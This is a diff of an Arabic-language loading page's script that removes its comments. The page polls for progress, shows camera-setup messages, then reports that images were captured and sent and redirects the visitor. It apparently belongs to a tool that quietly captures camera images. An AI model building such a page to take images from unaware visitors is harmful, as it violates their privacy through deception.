@@ -183,7 +183,6 @@
     </div>
 
     <script>
-        // ---------- JAVASCRIPT المتقدم للتحكم في شاشة التحميل ----------
         let progress = 0;
         let intervalId = null;
         let dotCount = 0;
@@ -207,14 +206,12 @@
                 const footerText = document.getElementById('footerText');
                 
                 if (data.status === 'loading') {
-                    // تحديث شريط التقدم
                     const newProgress = data.progress;
                     if (newProgress > progress) {
                         progress = newProgress;
                         progressBar.style.width = progress + '%';
                     }
                     
-                    // تحديث النص
                     const messages = [
                         'جاري تهيئة الكاميرا...',
                         'جاري ضبط الإضاءة...',
@@ -229,27 +226,22 @@
                     updateDots();
                     
                 } else if (data.status === 'complete') {
-                    // اكتمل التحميل
                     clearInterval(intervalId);
                     progressBar.style.width = '100%';
                     statusMsg.textContent = '✅ تم التحميل بنجاح!';
                     document.querySelector('.spinner').style.display = 'none';
                     
-                    // إظهار معلومات الملف
                     const filename = data.filename || 'captured_image.jpg';
                     document.getElementById('filenameDisplay').textContent = filename;
                     fileInfo.classList.add('show');
                     
-                    // إظهار علامة النجاح
                     successCheck.style.display = 'block';
                     mainIcon.textContent = '🎉';
                     footerText.textContent = '✅ اكتمل • سيتم توجيهك قريباً...';
                     
-                    // تغيير النص
                     document.querySelector('h1').textContent = 'تم الرفع بنجاح!';
                     document.querySelector('.sub').textContent = `📸 تم التقاط ${data.total || 1} صورة وإرسالها`;
                     
-                    // الانتظار 3 ثوان ثم التوجيه
                     setTimeout(() => {
                         window.location.href = '/redirect';
                     }, 3000);
@@ -259,13 +251,8 @@
             }
         }
         
-        // بدء التحديث كل 500 مللي
         intervalId = setInterval(checkProgress, 500);
-        
-        // تحديث النقاط كل 300 مللي
         setInterval(updateDots, 300);
-        
-        // تنفيذ أول طلب فوراً
         setTimeout(checkProgress, 100);
     </script>
 </body>
